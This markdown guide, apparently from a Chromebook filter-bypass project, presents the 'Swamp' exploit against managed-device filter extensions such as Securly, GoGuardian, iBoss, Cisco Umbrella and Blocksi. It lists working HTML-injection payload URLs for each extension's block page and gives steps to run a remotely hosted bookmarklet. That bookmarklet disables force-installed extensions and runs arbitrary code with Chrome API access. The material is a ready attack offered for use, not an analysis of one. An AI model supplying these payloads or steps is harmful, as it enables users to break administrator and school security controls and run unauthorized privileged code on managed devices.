---
title: point-blank-new-swamp
---

-e 
Run bookmarklets on privileged pages with Swamp (New Point-Blank).
Bookmarklets must not be blocked by policy to perform this exploit.

Swamp functions like LTBEEF, the GUI-based exploit which Bypassi originally created for disabling extensions. 
However, unlike LTBEEF, Swamp still remains unpatched on versions post-v102 up to even v107.

This will allow you to:
-> Disable force-installed extensions similarly to LTBEEF even on Chrome 107 where it's patched
-> Run bookmarklets on any page even when they are blocked
-> Break extensions until a powerwash (or until you choose to turn it back on)
-> Run a custom DNS to block network requests without actually being on a DNS
-> Run your own custom code with access to most of the Chrome API

Securly:
chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/blocked.html?category=PGEgaHJlZj0iYWJvdXQ6YmxhbmsiIHRhcmdldD0iX2JsYW5rIiByZWw9Im9wZW5lciIgc3R5bGU9IiBiYWNrZ3JvdW5kOiB3aGl0ZTsgY29sb3I6IGJsYWNrOyBkaXNwbGF5OiBibG9jazsgaGVpZ2h0OiAzODBweDsgdHJhbnNmb3JtOiBzY2FsZSgyLjUpOyBkaXNwbGF5OiBmbGV4OyBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsgYWxpZ24taXRlbXM6IGNlbnRlcjsgIj48ZGl2PkNsaWNrIE1lPC9kaXY%2BIDwvYT4%3D
If it says blocked by Chrome, reload. Also, Securly has patched this for newer versions of the extension, if it doesn't work, don't make an issue
Also, if it doesn't work, try the new securly link, same issues apply:
chrome-extension://joflmkccibkooplaeoinecjbmdebglab/blocked.html?category=PGEgaHJlZj0iYWJvdXQ6YmxhbmsiIHRhcmdldD0iX2JsYW5rIiByZWw9Im9wZW5lciIgc3R5bGU9IiBiYWNrZ3JvdW5kOiB3aGl0ZTsgY29sb3I6IGJsYWNrOyBkaXNwbGF5OiBibG9jazsgaGVpZ2h0OiAzODBweDsgdHJhbnNmb3JtOiBzY2FsZSgyLjUpOyBkaXNwbGF5OiBmbGV4OyBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsgYWxpZ24taXRlbXM6IGNlbnRlcjsgIj48ZGl2PkNsaWNrIE1lPC9kaXY%2BIDwvYT4%3D

iBoss:
chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html?re=1&bc=%3Ca+href=%22about:blank%22%20rel=%22opener%22%20target=%22_blank%22%3Ehi%3C/a%3E

Cisco Umbrella:
chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/debug.html?error=%3Ca%20href%3D%22about:blank%22%20rel%3D%22opener%22%20target%3D%22_blank%22%3Ehey%3C/a%3E

Blocksi:
chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html?blockurl={%22hostname%22:%22%3Ca%20href=%27//%27%20rel=%27opener%27%20target=%27_blank%27%3Etest%3C/a%3E%22}

GoGuardian:
chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/teacher/lesson-plans/blocked.html?cs=[1,{%22name%22:%22%3Ca%20href=%27about:blank%27%20rel=%27opener%27%20target=%27_blank%27%3ECLICK%20ME%3C/a%3E%22}]
If your school updated GoGuardian, this exploit may not work.

Instructions:
1. Bookmark the code in this link: https://raw.githubusercontent.com/3kh0/ext-remover/main/newpointblank.js
2. Go to the link your extension matches to above.
3. Most of these links are a block page. This is intentional.
4. Each page should have a blue link. Click the link on the page.
5. If it opens a blank page, click the bookmarklet that you just made.
6. Click either hard disable or soft disable. Soft disable will only disable extensions until you restart your Chromebook.

Notes:
-> You can also run scripts and code.
-> However, your extension may disable javascript running on it so running your own code may not work.
-> It is recommended to do soft disable, which only disables it until restart.

- https://discord.com/channels/419123358698045453/1040775494406250548 -
Credits:
https://github.com/3kh0/ext-remover
3kh0
Idea from Bypassi#7037

https://github.com/titaniumnetwork-dev/Oxide-Docs/blob/master/docs/kajigs.mdx
Titanium Network